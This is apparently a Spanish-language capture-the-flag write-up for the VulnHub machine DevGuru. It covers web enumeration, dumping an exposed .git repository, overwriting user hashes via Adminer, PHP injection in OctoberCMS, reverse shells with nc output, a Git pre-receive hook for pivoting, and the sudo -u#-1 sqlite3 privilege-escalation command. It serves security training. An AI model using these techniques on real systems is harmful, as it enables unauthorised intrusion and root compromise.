---
title: VH - DevGuru
published: true
categories: [Linux]
tags: [eJPT, OSCP, Media]
---

<img src="/assets/VH/vulnhub.png">

¡Hola!
Vamos a resolver de la máquina `DevGuru` de dificultad "Media" de la plataforma [VulnHub](https://www.vulnhub.com/entry/devguru-1,620/).

Técnicas Vistas: 

- **Web Enumeration**
- **Extracting the contents of .git directory - GitDumper**
- **Extracting the contents of .git directory - GitExtractor**
- **Information Leakage**
- **Gaining access to a Adminer 4.7.7 panel**
- **Generating a new bcrypt hash for a user in order to gain access to OctoberCMS backend**
- **OctoberCMS Exploitation - Markup + PHP Code Injection**
- **Abusing Adminer to gain access to Gitea**
- **Abusing Git Hooks (pre-receive) - Code Execution (User Pivoting)**
- **Abusing sudoers privilege (ALL, !root) NOPASSWD + Sudo version (u#-1) in order to become root**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `DevGuru`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
arp-scan -I ens33 --localnet

❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:8d:05:79, IPv4: 192.168.1.148
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.140	00:0c:29:0e:5e:0e	VMware, Inc.
192.168.1.141	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.135	4a:eb:12:03:0f:70	(Unknown: locally administered)
192.168.1.131	ac:67:84:98:f6:07	(Unknown)
192.168.1.137	f4:34:f0:50:7e:76	(Unknown)
192.168.1.129	c8:ff:77:4b:be:03	Dyson Limited
192.168.1.128	00:55:da:56:56:66	IEEE Registration Authority

```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.138`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 192.168.1.140
PING 192.168.1.140 (192.168.1.140) 56(84) bytes of data.
64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=42.3 ms

--- 192.168.1.140 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.140 -oG allPorts

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
8585/tcp open  unknown syn-ack ttl 64
MAC Address: 00:0C:29:0E:5E:0E (VMware)
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80,8585 192.168.1.140 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Corp - DevGuru
| http-git: 
|   192.168.1.140:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-generator: DevGuru
|_http-server-header: Apache/2.4.29 (Ubuntu)
8585/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=60ecd7a8301bf105; Path=/; HttpOnly
|     Set-Cookie: _csrf=VluJNJ4LW_nwHbcsR4od-V2-Mfw6MTY2OTE0OTE5NzYzNzc1ODMxMg; Path=/; Expires=Wed, 23 Nov 2022 20:33:17 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 22 Nov 2022 20:33:17 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
```
### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://192.168.1.140
http://192.168.1.140 [200 OK] Apache[2.4.29], Cookies[october_session], Country[RESERVED][ZZ], Email[support@devguru.loca,support@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[october_session], IP[192.168.1.140], MetaGenerator[DevGuru], Script, Title[Corp - DevGuru], X-UA-Compatible[IE=edge]
```
Abrimos el navegador y accedemos a la dirección de la máquina en los puertos 80 y 8585. En el puerto 80 vemos un servicio web mientras que en el 8585 observamos la página inicial de `Gitea`


<img src="/assets/VH/DevGuru/web80.png">



<img src="/assets/VH/DevGuru/web8585.png">



### Fuzzing

* * *

Iniciamos el reconocimiento de potenciales rutas de acceso web para el puerto 80.

En esta ocasión usaremos la herramienta **wfuzz** con un total de 200 hilos `(-t 200)` y utilizando el diccionario `directory-list-2.3-medium.txt` de nuestro repositorio de confianza [SecLists](https://github.com/danielmiessler/SecLists) de [Daniel Miessler](https://github.com/danielmiessler)

```java
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/common.txt http://192.168.1.140/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.140/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000011:   200        11 L     29 W       276 Ch      ".git/config"                                                                                                             
000000010:   200        1 L      2 W        23 Ch       ".git/HEAD"                                                                                                               
000000017:   200        32 L     38 W       413 Ch      ".gitignore"                                                                                                              
000000012:   200        976 L    5561 W     310040 Ch   ".git/index"                                                                                                              
000000194:   200        477 L    1390 W     18661 Ch    "About"                                                                                                                   
000000328:   200        266 L    788 W      10032 Ch    "Services"                                                                                                                
000000008:   301        9 L      28 W       313 Ch      ".git"                                                                                                                    
000000459:   200        477 L    1390 W     18661 Ch    "about"                                                                                                                   
000000787:   302        11 L     22 W       410 Ch      "backend"                                                                                                                 
000000024:   200        52 L     146 W      1678 Ch     ".htaccess"                                                                                                               
000001209:   301        9 L      28 W       315 Ch      "config"                                                                                                                  
000000096:   200        330 L    1034 W     12669 Ch    "0"                                                                                                                       
000002193:   200        330 L    1034 W     12719 Ch    "index.php"                                                                                                               
000002719:   301        9 L      28 W       316 Ch      "modules"                                                                                                                 
000003151:   301        9 L      28 W       316 Ch      "plugins"                                                                                                                 
000003715:   200        266 L    788 W      10032 Ch    "services"                                                                                                                
000003963:   301        9 L      28 W       316 Ch      "storage"                                                                                                                 
000004137:   301        9 L      28 W       315 Ch      "themes"                                                                                                                  
000004380:   301        9 L      28 W       315 Ch      "vendor"
```
Observamos en los resultados el directorio `/backend/`. Accedemos y encontramos el panel de login del CMS `October`


<img src="/assets/VH/DevGuru/october.png">


Por la información revelada por `Wappalyzer` nos damos cuenta de que la herramienta que se utiliza para administrar contenido en bases de datos es `Adminer 4.7.7`. Una búsqueda en google nos revela el acceso al panel de login accediendo a `/adminer.php`


<img src="/assets/VH/DevGuru/adminer.png">


### Reconocimiento Web

* * *

Los resultados del escaneo por `nmap` revela un directorio `/.git/`. Accedemos pero no sacamos mucha info


<img src="/assets/VH/DevGuru/git.png">


Podemos utilizar la herramienta `gitdumper` que podemos encontrar en [GitTools](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh) para descargarnos el repositorio almacenado

```ruby
./gitdumper.sh http://192.168.1.140/.git/ /home/yorch/Labs/VulnHub/Devguru1/content/git
.
.
.
```

una vez descargado utilizaremos la herramienta `extractor` del mismo respoitorio para recomponer la estructura de carpetas del proyecto

```ruby
./extractor.sh git/ fullproject/
.
.
.
```

una vez finalizada la operación tendremos un directorio `/fullproject` con el repositorio clonado

```java
❯ ls -la
drwxr-xr-x root root 244 B  Wed Nov 23 11:46:43 2022  .
drwxr-xr-x root root  84 B  Wed Nov 23 11:45:55 2022  ..
drwxr-xr-x root root  38 B  Wed Nov 23 11:45:56 2022  bootstrap
drwxr-xr-x root root 294 B  Wed Nov 23 11:45:56 2022  config
drwxr-xr-x root root  32 B  Wed Nov 23 11:46:15 2022  modules
drwxr-xr-x root root  14 B  Wed Nov 23 11:46:39 2022  plugins
drwxr-xr-x root root  62 B  Wed Nov 23 11:46:43 2022  storage
drwxr-xr-x root root   8 B  Wed Nov 23 11:46:43 2022  themes
.rw-r--r-- root root 413 B  Wed Nov 23 11:45:55 2022  .gitignore
.rw-r--r-- root root 1.6 KB Wed Nov 23 11:45:55 2022  .htaccess
.rw-r--r-- root root 354 KB Wed Nov 23 11:45:56 2022  adminer.php
.rw-r--r-- root root 1.6 KB Wed Nov 23 11:45:56 2022  artisan
.rw-r--r-- root root 167 B  Wed Nov 23 11:45:55 2022  commit-meta.txt
.rw-r--r-- root root 1.1 KB Wed Nov 23 11:45:56 2022  index.php
.rw-r--r-- root root 1.5 KB Wed Nov 23 11:45:55 2022  README.md
.rw-r--r-- root root 551 B  Wed Nov 23 11:46:39 2022  server.php

    /home/y/L/Vu/De/c/fullproject/0-7de9115700c5656c670b34987c6fbffd39d90cf2  硫  ✔  
```

Accediendo al directorio `config` y examinando el archivo `database.php` encontramos unas credenciales para mysql


<img src="/assets/VH/DevGuru/creds.png">


Accedemos al panel de login de `Adminer` y con las credenciales obtenidas accedemos al panel de control


<img src="/assets/VH/DevGuru/controlpanel.png">


Nos llama la atención la tabla `backend_users`. Clickamos esta tabla y visualizamos contenido encontrando un usuario `frank` junto su password hasheada


<img src="/assets/VH/DevGuru/frank.png">


Podríamos tratar de crackear la password pero como tenemos la capacidad de modificar los registros de la tabla vamos a generar nuestro hash tipo `bcrypt` y sustituir el del usuario frank. para ello utilizaremos la página [Bcrypt-Generator](https://bcrypt-generator.com/)


<img src="/assets/VH/DevGuru/bcrypt.png">


Con las credenciales modificadas nos legueamos en el panel de `October CMS` y ganamos acceso


<img src="/assets/VH/DevGuru/franklogin.png">


Accedemos a la pestaña `CMS` en donde tenemos capacidad de modificar las páginas del CMS. Buscamos en Google cómo inyectar código PHP en October


<img src="/assets/VH/DevGuru/phpcode.png">


En lugar de `Hello World!` insertamos nuestro código PHP


<img src="/assets/VH/DevGuru/cmd.png">


Probamos que tengamos capacidad de ejecución remota de comandos en la página principal


<img src="/assets/VH/DevGuru/rce.png">


Sabiendo que tenemos RCE ejecutamos el típico oneliner de bash para entablar una reverse shell con la máquina víctima. nos ponemos en escucha en el puerto 443 y ganamos acceso a la máquina víctima


<img src="/assets/VH/DevGuru/oneliner.png">


```bash
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.140] 54914
bash: cannot set terminal process group (1010): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devguru:/var/www/html$ whoami
whoami
www-data
```

### Movimiento Lateral

* * *

Enumerando directorios accedemos a `/var/backups` donde encontramos un archivo `app.ini.bak`. Observando su contenido detalladamente localizamos las credenciales para mysql de `gitea`


<img src="/assets/VH/DevGuru/newcreds.png">


Accedemos con estas credenciales a través del panel de login de `Adminer`. En la base de datos `gitea` vemos una tabla `users` y visualizamos las credenciales para `gitea` del usuario `frank`. De la misma forma que antes como tenemos capacidad de cambiar la password, generamos una con Bcrypt-Generator y la guardamos. Esta vez tendremos que cambiar también el tipo de hash a `bcrypt`


<img src="/assets/VH/DevGuru/newfrank.png">


Accedemos a la cuenta de gitea de frank


<img src="/assets/VH/DevGuru/giteafrank.png">


A partir de aquí navegamos a `Profile` y accedemos al repositorio privado `devguru-website` y una vez dentro navegamos a `Settings > Git Hooks` para editar `pre-receive` y añadir el oneliner de bash para entablar una reverse shell con el usuario `frank`


<img src="/assets/VH/DevGuru/hook.png">


Guardamos cambios, nos abrimos un listener por el puerto 443 en nuestro equipo y para que ejecute el hook debemos hacer commit para guardar los cambios

```bash
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.140] 55326
bash: cannot set terminal process group (674): Inappropriate ioctl for device
bash: no job control in this shell
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ whoami
whoami
frank
```
Podemos acceder a la flag de usuario en su directorio personal

```bash
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ cat /home/frank/user.txt 
22854d0aec6ba776f***************
```

### Escalada de Privilegios

* * *

Listamos privilegios de sudo y vemos que podemos ejecutar `sqlite3` pero no como root

```bash
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo -l
Matching Defaults entries for frank on devguru:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on devguru:
    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

Buscamos en `GTFOBins` y vemos como escalar privilegios


<img src="/assets/VH/DevGuru/gtfo.png">


Si ejecutamos el oneliner obtenido en GTFOBins no conseguimos elevar privilegios. Nos fijamos en la versión de sudo que es la 1.8.21p2 y gracias a que tenemos una versión antigua de sudo tenemos una vía potencial de evitar restricciones de la siguiente forma

```bash
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
root@devguru:~/gitea-repositories/frank/devguru-website.git# whoami
root
```
Ya podemos acceder a la flag de root en el directorio `/root`

```bash
root@devguru:~/gitea-repositories/frank/devguru-website.git# cat /root/root.txt
96440606fb88aa749***************
```

Hemos completado la máquina **DevGuru** de VulnHub!! Happy Hacking!!
